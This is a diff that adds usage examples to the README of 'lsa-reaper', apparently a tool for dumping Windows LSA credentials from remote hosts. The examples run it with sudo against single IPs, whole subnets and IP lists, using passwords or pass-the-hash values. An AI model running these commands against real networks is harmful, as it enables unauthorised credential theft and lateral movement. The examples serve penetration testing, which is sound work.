@@ -21,3 +21,24 @@ sudo python3 setup.py install
 sudo python3 lsa-reaper.py
 ```
 ![](/assets/help.png)
+
+## Examples
+```
+sudo python3 lsa-reaper.py domain/user:'Password'@ip
+
+sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.100
+
+sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.0/24
+
+sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.10-200
+
+sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@ipList.txt
+
+sudo python3 lsa-reaper.py testdomain/testuser@10.0.0.100
+
+sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.100
+
+sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100
+
+sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100
+```
